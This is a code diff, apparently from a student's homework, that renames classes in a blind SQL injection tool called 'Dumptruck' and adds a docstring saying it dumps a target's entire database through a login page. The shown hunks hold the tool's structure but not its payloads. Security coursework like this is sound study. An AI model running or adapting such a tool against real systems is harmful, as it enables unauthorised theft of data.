@@ -1,3 +1,10 @@
+"""
+Kind of went overboard with this homework, writing a Blind SQL Injection 
+attack cheekily-named "Dumptruck".
+
+Executes exhaustive, Blind SQLi attack on target, dumping entire database.
+"""
+
 import logging
 import os
 import time
@@ -18,7 +25,7 @@ from yachalk import chalk
 # Configuration
 DOMAIN = os.environ.get("DOMAIN")
 URL = f"http://{DOMAIN}:1241"
-TARGET = f"{URL}/login.php"  # Request endpoint/target
+TARGET = f"{URL}/login.php"  # Request endpoint
 
 # Constants
 MIN_SIZE = 1
@@ -52,7 +59,7 @@ class InjectionType(Enum):
     VALUE_LENGTH = 7
 
 
-class DumpTruck:
+class Dumptruck:
     def __init__(self, name, tables, columns, values):
         self.name = name
         self.tables = tables
@@ -73,15 +80,13 @@ class DumpTruck:
         )
 
 
-class DumpTruckWorker(Thread):
+class DumptruckWorker(Thread):
     def __init__(self, value=0):
-        super(DumpTruckWorker, self).__init__()
-
+        super(DumptruckWorker, self).__init__()
         self.value = value
 
     def run(self):
         self.printIntro()
-
         database = get_database()
         database.dump()
 
@@ -333,7 +338,7 @@ def get_database():
     table_columns = blind_table_columns(tables)
     values = blind_values(table_columns)
 
-    return DumpTruck(db_name, tables, table_columns, values)
+    return Dumptruck(db_name, tables, table_columns, values)
 
 
 def set_session_cookies(cookies):
@@ -443,7 +448,7 @@ def main():
     ]
     set_session_cookies(cookies)
 
-    worker = DumpTruckWorker()
+    worker = DumptruckWorker()
     progress = ProgressThread(worker)
 
     worker.start()
